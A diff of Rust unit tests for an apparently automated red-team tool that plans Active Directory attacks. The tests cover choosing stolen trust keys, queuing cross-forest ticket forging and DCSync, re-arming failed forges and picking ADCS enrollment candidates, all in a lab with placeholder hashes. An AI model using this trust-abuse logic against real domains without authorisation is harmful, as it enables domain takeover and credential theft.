+    fn empty_dump_forge_rearms_when_an_aes_key_lands_for_the_same_trust() {
+        let mut s = StateInner::new("op".into());
+        let key = "trust_follow:fabrikam.local:FABRIKAM$";
+        s.hashes
+            .push(trust_hash("FABRIKAM$", "contoso.local", "aabb", None));
+        park_empty_dump(&mut s, key, "aabb:", 0);
+
+        s.hashes.push(trust_hash(
+            "FABRIKAM$",
+            "contoso.local",
+            "aabb",
+            Some("ccdd"),
+        ));
+
+        let rearmed = sweep_rearmable_empty_dump_forges(&mut s);
+        assert_eq!(rearmed.len(), 1);
+        assert_eq!(rearmed[0].0, key);
+        assert!(
+            !s.is_processed(DEDUP_TRUST_FOLLOW, key),
+            "an AES256 upgrade is exactly what turns the empty dump into a real DCSync"
+        );
+        assert_eq!(s.forge_empty_dump[key].attempts, 1);
+    }
+
+    #[test]
+    fn empty_dump_forge_rearms_when_a_rotated_trust_key_lands() {
+        let mut s = StateInner::new("op".into());
+        let key = "trust_follow:fabrikam.local:FABRIKAM$";
+        s.hashes
+            .push(trust_hash("FABRIKAM$", "contoso.local", "aabb", None));
+        park_empty_dump(&mut s, key, "aabb:", 0);
+
+        s.hashes
+            .push(trust_hash("FABRIKAM$", "contoso.local", "eeff", None));
+
+        assert_eq!(sweep_rearmable_empty_dump_forges(&mut s).len(), 1);
+        assert!(!s.is_processed(DEDUP_TRUST_FOLLOW, key));
+    }
+
+    #[test]
+    fn empty_dump_forge_converges_to_locked_after_the_attempt_cap() {
+        let mut s = StateInner::new("op".into());
+        let key = "trust_follow:fabrikam.local:FABRIKAM$";
+        s.hashes
+            .push(trust_hash("FABRIKAM$", "contoso.local", "aabb", None));
+        park_empty_dump(&mut s, key, "aabb:", MAX_EMPTY_DUMP_FORGE_ATTEMPTS);
+
+        s.hashes
+            .push(trust_hash("FABRIKAM$", "contoso.local", "eeff", None));
+
+        assert!(
+            sweep_rearmable_empty_dump_forges(&mut s).is_empty(),
+            "a genuinely SID-filtered trust must stop re-arming, not churn forever"
+        );
+        assert!(s.is_processed(DEDUP_TRUST_FOLLOW, key));
+    }
+
+    #[test]
+    fn empty_dump_forge_ignores_material_belonging_to_another_trust() {
+        let mut s = StateInner::new("op".into());
+        let key = "trust_follow:fabrikam.local:FABRIKAM$";
+        s.hashes
+            .push(trust_hash("FABRIKAM$", "contoso.local", "aabb", None));
+        park_empty_dump(&mut s, key, "aabb:", 0);
+
+        s.hashes
+            .push(trust_hash("OTHER$", "contoso.local", "eeff", Some("9999")));
+
+        assert!(
+            sweep_rearmable_empty_dump_forges(&mut s).is_empty(),
+            "an unrelated trust key must not re-arm this forge"
+        );
+    }
+
+    #[test]
+    fn sweep_keeps_fresh_entry_and_leaves_dedup_marked() {
+        let mut s = StateInner::new("op".into());
+        let key = "trust_follow:contoso.local:fabrikam$".to_string();
+        s.mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+        s.forge_in_flight.insert(key.clone(), Instant::now());
+
+        let cleared = sweep_stale_forge_in_flight(&mut s);
+
+        assert!(
+            cleared.is_empty(),
+            "fresh forge_in_flight must not be swept"
+        );
+        assert_eq!(s.forge_in_flight.len(), 1);
+        assert!(s.is_processed(DEDUP_TRUST_FOLLOW, &key));
+    }
+
+    #[test]
+    fn sweep_only_touches_stale_entries() {
+        let mut s = StateInner::new("op".into());
+        let stale_key = "trust_follow:contoso.local:fabrikam$".to_string();
+        let fresh_key = "trust_follow:contoso.local:padme$".to_string();
+        s.mark_processed(DEDUP_TRUST_FOLLOW, stale_key.clone());
+        s.mark_processed(DEDUP_TRUST_FOLLOW, fresh_key.clone());
+        s.forge_in_flight.insert(stale_key.clone(), stale_instant());
+        s.forge_in_flight.insert(fresh_key.clone(), Instant::now());
+
+        let cleared = sweep_stale_forge_in_flight(&mut s);
+
+        assert_eq!(cleared, vec![stale_key.clone()]);
+        assert!(!s.is_processed(DEDUP_TRUST_FOLLOW, &stale_key));
+        assert!(
+            s.is_processed(DEDUP_TRUST_FOLLOW, &fresh_key),
+            "fresh sibling entry must keep its dedup mark"
+        );
+        assert!(s.forge_in_flight.contains_key(&fresh_key));
+    }
+
+    #[test]
+    fn sweep_no_op_when_map_empty() {
+        let mut s = StateInner::new("op".into());
+        let cleared = sweep_stale_forge_in_flight(&mut s);
+        assert!(cleared.is_empty());
+    }
+
+    #[test]
+    fn sweep_at_exactly_limit_clears() {
+        // Boundary case: an entry exactly at the staleness limit should be
+        // swept (the planner can't afford an off-by-one that keeps a doomed
+        // dispatch stuck for one more tick).
+        let mut s = StateInner::new("op".into());
+        let key = "trust_follow:contoso.local:fabrikam$".to_string();
+        s.mark_processed(DEDUP_TRUST_FOLLOW, key.clone());
+        s.forge_in_flight.insert(
+            key.clone(),
+            Instant::now()
+                .checked_sub(FORGE_STALENESS_LIMIT)
+                .unwrap_or_else(Instant::now),
+        );
+
+        let cleared = sweep_stale_forge_in_flight(&mut s);
+
+        assert_eq!(cleared, vec![key]);
+    }
+
+    // collect_trust_follow_work_from_vulns
+
+    fn make_trust_hash(domain: &str, account: &str, value: &str) -> ares_core::models::Hash {
+        ares_core::models::Hash {
+            id: format!("h-{account}"),
+            username: account.into(),
             hash_value: value.into(),
             hash_type: "NTLM".into(),
             domain: domain.into(),
@@ -3256,302 +4207,335 @@ mod tests {
             aes_key: None,
             is_previous: false,
             source_host: None,
-            is_trust_key: false,
+            is_trust_key: true,
             trust_pair_label: None,
         }
     }
 
-    fn make_admin_cred(password: &str, domain: &str) -> ares_core::models::Credential {
-        ares_core::models::Credential {
-            id: format!("c-admin-{domain}"),
-            username: "Administrator".into(),
-            password: password.into(),
-            domain: domain.into(),
-            source: String::new(),
-            discovered_at: None,
-            is_admin: true,
-            parent_id: None,
-            attack_step: 0,
-        }
-    }
-
-    // --- collect_candidate_children ------------------------------------
-
-    #[test]
-    fn collect_candidates_includes_dominated_domains() {
-        let mut s = StateInner::new("op".into());
-        s.dominated_domains.insert("child.contoso.local".into());
-        s.dominated_domains.insert("Other.Domain".into());
-        let v = collect_candidate_children(&s);
-        assert!(v.contains("child.contoso.local"));
-        // Returned set must be lowercased.
-        assert!(v.contains("other.domain"));
+    fn forest_trust_vuln(
+        source: &str,
+        target: &str,
+        account: &str,
+        target_dc_ip: &str,
+    ) -> ares_core::models::VulnerabilityInfo {
+        build_trust_escalation_vuln(source, target, account, target_dc_ip)
     }
 
     #[test]
-    fn collect_candidates_includes_admin_hash_domains() {
+    fn vuln_driven_emits_work_when_hash_matches() {
         let mut s = StateInner::new("op".into());
-        s.hashes.push(make_admin_hash(
+        s.hashes.push(make_trust_hash(
             "contoso.local",
-            "deadbeef".repeat(4).as_str(),
+            "FABRIKAM$",
+            "aad3b435b51404eeaad3b435b51404ee:1111111111111111",
         ));
-        let v = collect_candidate_children(&s);
-        assert!(v.contains("contoso.local"));
+        let v = forest_trust_vuln(
+            "contoso.local",
+            "fabrikam.local",
+            "FABRIKAM$",
+            "192.168.58.40",
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+
+        let work = collect_trust_follow_work_from_vulns(&s);
+        assert_eq!(work.len(), 1);
+        let w = &work[0];
+        assert_eq!(w.dedup_key, "trust_follow:contoso.local:fabrikam$");
+        assert_eq!(w.source_domain, "contoso.local");
+        assert_eq!(w.target_domain, "fabrikam.local");
+        assert_eq!(w.target_dc_ip.as_deref(), Some("192.168.58.40"));
+        assert_eq!(w.hash.username, "FABRIKAM$");
     }
 
     #[test]
-    fn collect_candidates_skips_empty_hash_value() {
+    fn vuln_driven_skips_when_no_matching_hash() {
+        // Vuln names FABRIKAM$ but state only has a different trust key — the
+        // dispatcher would have nothing to forge with, so skip the work item.
         let mut s = StateInner::new("op".into());
-        let mut h = make_admin_hash("contoso.local", "deadbeef");
-        h.hash_value = String::new();
-        s.hashes.push(h);
-        assert!(collect_candidate_children(&s).is_empty());
+        s.hashes.push(make_trust_hash(
+            "contoso.local",
+            "OTHER$",
+            "aad3b435b51404eeaad3b435b51404ee:2222222222222222",
+        ));
+        let v = forest_trust_vuln(
+            "contoso.local",
+            "fabrikam.local",
+            "FABRIKAM$",
+            "192.168.58.40",
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+
+        assert!(collect_trust_follow_work_from_vulns(&s).is_empty());
     }
 
     #[test]
-    fn collect_candidates_skips_empty_domain() {
+    fn vuln_driven_skips_already_exploited() {
         let mut s = StateInner::new("op".into());
-        let mut h = make_admin_hash("", "deadbeef");
+        s.hashes.push(make_trust_hash(
+            "contoso.local",
+            "FABRIKAM$",
+            "aad3b435b51404eeaad3b435b51404ee:3333333333333333",
+        ));
+        let v = forest_trust_vuln(
+            "contoso.local",
+            "fabrikam.local",
+            "FABRIKAM$",
+            "192.168.58.40",
+        );
+        let id = v.vuln_id.clone();
+        s.discovered_vulnerabilities.insert(id.clone(), v);
+        s.exploited_vulnerabilities.insert(id);
+
+        assert!(collect_trust_follow_work_from_vulns(&s).is_empty());
+    }
+
+    #[test]
+    fn vuln_driven_skips_already_processed_dedup() {
+        let mut s = StateInner::new("op".into());
+        s.hashes.push(make_trust_hash(
+            "contoso.local",
+            "FABRIKAM$",
+            "aad3b435b51404eeaad3b435b51404ee:4444444444444444",
+        ));
+        let v = forest_trust_vuln(
+            "contoso.local",
+            "fabrikam.local",
+            "FABRIKAM$",
+            "192.168.58.40",
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+        s.mark_processed(
+            DEDUP_TRUST_FOLLOW,
+            "trust_follow:contoso.local:fabrikam$".into(),
+        );
+
+        assert!(collect_trust_follow_work_from_vulns(&s).is_empty());
+    }
+
+    #[test]
+    fn vuln_driven_skips_non_forest_trust_vuln_types() {
+        // The vuln-driven fallback is scoped to cross-forest
+        // (`forest_trust_escalation`) — intra-forest (`child_to_parent`)
+        // work is built reliably by the hash-iteration path and would
+        // double-emit if also picked up here.
+        let mut s = StateInner::new("op".into());
+        s.hashes.push(make_trust_hash(
+            "child.contoso.local",
+            "CHILD$",
+            "aad3b435b51404eeaad3b435b51404ee:5555555555555555",
+        ));
+        let v = build_trust_escalation_vuln(
+            "child.contoso.local",
+            "contoso.local",
+            "CHILD$",
+            "192.168.58.20",
+        );
+        // Sanity check: this is the intra-forest variant.
+        assert_eq!(v.vuln_type, "child_to_parent");
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+
+        assert!(collect_trust_follow_work_from_vulns(&s).is_empty());
+    }
+
+    #[test]
+    fn vuln_driven_falls_back_to_resolve_dc_ip_when_target_empty() {
+        let mut s = StateInner::new("op".into());
+        s.hashes.push(make_trust_hash(
+            "contoso.local",
+            "FABRIKAM$",
+            "aad3b435b51404eeaad3b435b51404ee:6666666666666666",
+        ));
+        s.domain_controllers
+            .insert("fabrikam.local".into(), "192.168.58.41".into());
+
+        // Hand-craft a vuln with `target = ""` to exercise the resolve_dc_ip
+        // fallback (`build_trust_escalation_vuln` always sets target, so we
+        // build directly).
+        let mut v = build_trust_escalation_vuln(
+            "contoso.local",
+            "fabrikam.local",
+            "FABRIKAM$",
+            "192.168.58.40",
+        );
+        v.target = String::new();
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+
+        let work = collect_trust_follow_work_from_vulns(&s);
+        assert_eq!(work.len(), 1);
+        assert_eq!(work[0].target_dc_ip.as_deref(), Some("192.168.58.41"));
+    }
+
+    #[test]
+    fn vuln_driven_matches_hash_when_domain_field_empty() {
+        // NTDS dumps occasionally land trust-key rows with empty `domain` —
+        // historically a common source of silent skips in the hash-iteration
+        // path. The vuln-driven path must still match those.
+        let mut s = StateInner::new("op".into());
+        let mut h = make_trust_hash(
+            "",
+            "FABRIKAM$",
+            "aad3b435b51404eeaad3b435b51404ee:7777777777777777",
+        );
         h.domain = String::new();
         s.hashes.push(h);
-        assert!(collect_candidate_children(&s).is_empty());
-    }
+        let v = forest_trust_vuln(
+            "contoso.local",
+            "fabrikam.local",
+            "FABRIKAM$",
+            "192.168.58.40",
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
 
-    #[test]
-    fn collect_candidates_skips_non_admin_users() {
-        let mut s = StateInner::new("op".into());
-        let mut h = make_admin_hash("contoso.local", "deadbeef");
-        h.username = "alice".into();
-        s.hashes.push(h);
-        assert!(collect_candidate_children(&s).is_empty());
-    }
-
-    #[test]
-    fn collect_candidates_skips_non_ntlm_hashes() {
-        let mut s = StateInner::new("op".into());
-        let mut h = make_admin_hash("contoso.local", "deadbeef");
-        h.hash_type = "AES256".into();
-        s.hashes.push(h);
-        assert!(collect_candidate_children(&s).is_empty());
-    }
-
-    #[test]
-    fn collect_candidates_returns_empty_when_no_signals() {
-        let s = StateInner::new("op".into());
-        assert!(collect_candidate_children(&s).is_empty());
-    }
-
-    // --- build_child_to_parent_work_path_a ----------------------------
-
-    #[test]
-    fn path_a_emits_work_for_valid_child() {
-        let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        let work = build_child_to_parent_work_path_a(&s, &candidates);
+        let work = collect_trust_follow_work_from_vulns(&s);
         assert_eq!(work.len(), 1);
-        assert_eq!(work[0].0, "raise_child:child.contoso.local");
-        assert_eq!(work[0].1, "child.contoso.local");
-        assert_eq!(work[0].2, "contoso.local");
-        assert_eq!(work[0].3, "192.168.58.11");
     }
 
     #[test]
-    fn path_a_skips_short_fqdn() {
-        let s = StateInner::new("op".into());
-        // Only 2 labels — no parent extractable.
-        let candidates: HashSet<String> = ["contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_a(&s, &candidates).is_empty());
-    }
-
-    #[test]
-    fn path_a_skips_already_dominated_parent() {
+    fn vuln_driven_prefers_current_over_history_key() {
         let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        s.dominated_domains.insert("contoso.local".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_a(&s, &candidates).is_empty());
-    }
-
-    #[test]
-    fn path_a_skips_parent_with_no_dc_ip() {
-        let mut s = StateInner::new("op".into());
-        // child has DC IP, parent does not → skip.
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_a(&s, &candidates).is_empty());
-    }
-
-    #[test]
-    fn path_a_skips_child_with_no_dc_ip() {
-        let mut s = StateInner::new("op".into());
-        // parent has DC IP, child does not → skip.
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_a(&s, &candidates).is_empty());
-    }
-
-    #[test]
-    fn path_a_skips_already_processed_dedup() {
-        let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        s.mark_processed(DEDUP_TRUST_FOLLOW, "raise_child:child.contoso.local".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_a(&s, &candidates).is_empty());
-    }
-
-    // --- build_child_to_parent_work_path_b ----------------------------
-
-    #[test]
-    fn path_b_emits_when_explicit_trust_matches_candidate() {
-        let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        // Explicit parent_child trust.
-        s.trusted_domains.insert(
-            "contoso.local".into(),
-            ares_core::models::TrustInfo {
-                domain: "contoso.local".into(),
-                flat_name: "CONTOSO".into(),
-                direction: "bidirectional".into(),
-                trust_type: "parent_child".into(),
-                sid_filtering: false,
-                security_identifier: None,
-            },
+        let mut history = make_trust_hash(
+            "contoso.local",
+            "FABRIKAM$",
+            "aad3b435b51404eeaad3b435b51404ee:88888888",
         );
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        let work = build_child_to_parent_work_path_b(&s, &candidates, &HashSet::new());
+        history.id = "h-history".into();
+        history.is_previous = true;
+        let mut current = make_trust_hash(
+            "contoso.local",
+            "FABRIKAM$",
+            "aad3b435b51404eeaad3b435b51404ee:99999999",
+        );
+        current.id = "h-current".into();
+        current.is_previous = false;
+        s.hashes.push(history);
+        s.hashes.push(current);
+
+        let v = forest_trust_vuln(
+            "contoso.local",
+            "fabrikam.local",
+            "FABRIKAM$",
+            "192.168.58.40",
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+
+        let work = collect_trust_follow_work_from_vulns(&s);
         assert_eq!(work.len(), 1);
-        assert_eq!(work[0].1, "child.contoso.local");
-        assert_eq!(work[0].2, "contoso.local");
+        assert_eq!(work[0].hash.id, "h-current");
     }
 
     #[test]
-    fn path_b_skips_when_key_already_in_existing() {
+    fn vuln_driven_prefers_trust_key_over_same_named_computer_account() {
         let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.domain_controllers
-            .insert("child.contoso.local".into(), "192.168.58.11".into());
-        s.trusted_domains.insert(
-            "contoso.local".into(),
-            ares_core::models::TrustInfo {
-                domain: "contoso.local".into(),
-                flat_name: "CONTOSO".into(),
-                direction: "bidirectional".into(),
-                trust_type: "parent_child".into(),
-                sid_filtering: false,
-                security_identifier: None,
-            },
+
+        let mut impostor = make_trust_hash(
+            "contoso.local",
+            "FABRIKAM$",
+            "aad3b435b51404eeaad3b435b51404ee:11111111",
         );
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        let existing: HashSet<String> = ["raise_child:child.contoso.local".to_string()]
-            .into_iter()
-            .collect();
-        assert!(build_child_to_parent_work_path_b(&s, &candidates, &existing).is_empty());
-    }
+        impostor.id = "h-shadow".into();
+        impostor.source = "certipy_shadow".into();
+        impostor.is_trust_key = false;
+        impostor.trust_pair_label = None;
 
-    #[test]
-    fn path_b_skips_non_parent_child_trusts() {
-        let mut s = StateInner::new("op".into());
-        s.domain_controllers
-            .insert("contoso.local".into(), "192.168.58.10".into());
-        s.trusted_domains.insert(
-            "contoso.local".into(),
-            ares_core::models::TrustInfo {
-                domain: "contoso.local".into(),
-                flat_name: "CONTOSO".into(),
-                direction: "bidirectional".into(),
-                trust_type: "forest".into(),
-                sid_filtering: false,
-                security_identifier: None,
-            },
+        let mut trust_key = make_trust_hash(
+            "contoso.local",
+            "FABRIKAM$",
+            "aad3b435b51404eeaad3b435b51404ee:22222222",
         );
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_b(&s, &candidates, &HashSet::new()).is_empty());
+        trust_key.id = "h-trustkey".into();
+        trust_key.source = "secretsdump".into();
+        trust_key.is_trust_key = true;
+
+        // Impostor first: ranking on `is_previous` alone would take it, since
+        // both rows are current.
+        s.hashes.push(impostor);
+        s.hashes.push(trust_key);
+
+        let v = forest_trust_vuln(
+            "contoso.local",
+            "fabrikam.local",
+            "FABRIKAM$",
+            "192.168.58.40",
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+
+        let work = collect_trust_follow_work_from_vulns(&s);
+        assert_eq!(work.len(), 1);
+        assert_eq!(
+            work[0].hash.id, "h-trustkey",
+            "a computer-object takeover shares the name but is not the inter-realm key — \
+             forging with it is a guaranteed KRB_AP_ERR_BAD_INTEGRITY"
+        );
     }
 
     #[test]
-    fn path_b_returns_empty_when_no_trusts() {
-        let s = StateInner::new("op".into());
-        let candidates: HashSet<String> = ["child.contoso.local".to_string()].into_iter().collect();
-        assert!(build_child_to_parent_work_path_b(&s, &candidates, &HashSet::new()).is_empty());
-    }
-
-    // --- find_child_to_parent_admin_cred ------------------------------
-
-    #[test]
-    fn find_admin_cred_prefers_password() {
+    fn vuln_driven_still_forges_when_no_row_is_stamped() {
         let mut s = StateInner::new("op".into());
-        s.credentials
-            .push(make_admin_cred("P@ss!", "child.contoso.local"));
-        s.hashes
-            .push(make_admin_hash("child.contoso.local", "deadbeef"));
-        let (payload, method) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert_eq!(method, "password");
-        assert_eq!(payload.unwrap()["password"], "P@ss!");
+        let mut unstamped = make_trust_hash(
+            "contoso.local",
+            "FABRIKAM$",
+            "aad3b435b51404eeaad3b435b51404ee:33333333",
+        );
+        unstamped.id = "h-unstamped".into();
+        unstamped.is_trust_key = false;
+        s.hashes.push(unstamped);
+
+        let v = forest_trust_vuln(
+            "contoso.local",
+            "fabrikam.local",
+            "FABRIKAM$",
+            "192.168.58.40",
+        );
+        s.discovered_vulnerabilities.insert(v.vuln_id.clone(), v);
+
+        let work = collect_trust_follow_work_from_vulns(&s);
+        assert_eq!(
+            work.len(),
+            1,
+            "older ops and LSA-secret rows predate the flag — an unstamped row is \
+             still the only candidate and must not be dropped"
+        );
+        assert_eq!(work[0].hash.id, "h-unstamped");
     }
 
     #[test]
-    fn find_admin_cred_falls_back_to_hash() {
-        let mut s = StateInner::new("op".into());
-        s.hashes
-            .push(make_admin_hash("child.contoso.local", "deadbeef"));
-        let (payload, method) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert_eq!(method, "hash");
-        let p = payload.unwrap();
-        assert_eq!(p["username"], "Administrator");
-        assert_eq!(p["admin_hash"], "deadbeef");
-    }
-
-    #[test]
-    fn find_admin_cred_skips_non_admin_credential() {
-        let mut s = StateInner::new("op".into());
-        let mut c = make_admin_cred("P@ss!", "child.contoso.local");
-        c.is_admin = false;
-        s.credentials.push(c);
-        let (payload, method) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert!(payload.is_none());
-        assert_eq!(method, "none");
-    }
-
-    #[test]
-    fn find_admin_cred_skips_empty_password() {
-        let mut s = StateInner::new("op".into());
-        let c = make_admin_cred("", "child.contoso.local");
-        s.credentials.push(c);
-        let (payload, _) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert!(payload.is_none());
-    }
-
-    #[test]
-    fn find_admin_cred_filters_by_domain() {
-        let mut s = StateInner::new("op".into());
-        s.credentials
-            .push(make_admin_cred("P@ss!", "fabrikam.local"));
-        let (payload, method) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert!(payload.is_none());
-        assert_eq!(method, "none");
-    }
-
-    #[test]
-    fn find_admin_cred_returns_none_when_both_empty() {
-        let s = StateInner::new("op".into());
-        let (payload, method) = find_child_to_parent_admin_cred(&s, "child.contoso.local");
-        assert!(payload.is_none());
-        assert_eq!(method, "none");
+    fn native_adcs_enum_candidate_prefers_same_domain_password_user() {
+        use super::is_native_adcs_enum_candidate;
+        let mk = |user: &str, pw: &str, dom: &str| ares_core::models::Credential {
+            id: String::new(),
+            username: user.into(),
+            password: pw.into(),
+            domain: dom.into(),
+            source: String::new(),
+            discovered_at: None,
+            is_admin: false,
+            parent_id: None,
+            attack_step: 0,
+        };
+        // Native user with a recovered password -> eligible enrollee.
+        assert!(is_native_adcs_enum_candidate(
+            &mk("alice", "P@ssw0rd!", "fabrikam.local"),
+            "fabrikam.local"
+        ));
+        // Case-insensitive domain match.
+        assert!(is_native_adcs_enum_candidate(
+            &mk("alice", "P@ssw0rd!", "FABRIKAM.LOCAL"),
+            "fabrikam.local"
+        ));
+        // Source-forest account (wrong domain) -> not native.
+        assert!(!is_native_adcs_enum_candidate(
+            &mk("admin", "P@ssw0rd!", "contoso.local"),
+            "fabrikam.local"
+        ));
+        // Machine account -> excluded.
+        assert!(!is_native_adcs_enum_candidate(
+            &mk("web01$", "P@ssw0rd!", "fabrikam.local"),
+            "fabrikam.local"
+        ));
+        // Uncracked (no plaintext) -> not a bind candidate.
+        assert!(!is_native_adcs_enum_candidate(
+            &mk("bob", "", "fabrikam.local"),
+            "fabrikam.local"
+        ));
     }
 }
